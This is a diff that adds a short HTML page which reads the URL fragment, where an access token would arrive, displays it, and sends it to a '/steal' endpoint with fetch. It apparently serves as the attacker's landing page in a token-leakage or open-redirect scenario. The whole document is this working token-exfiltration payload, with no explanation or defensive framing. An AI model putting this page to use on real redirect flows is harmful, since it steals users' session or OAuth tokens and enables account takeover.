@@ -1,0 +1,8 @@
+<html><body>
+<pre id="t">Reading token...</pre>
+<script>
+  var h = location.hash;
+  document.getElementById('t').innerText = h;
+  if(h) fetch('/steal?' + h.replace('#',''));
+</script>
+</body></html>
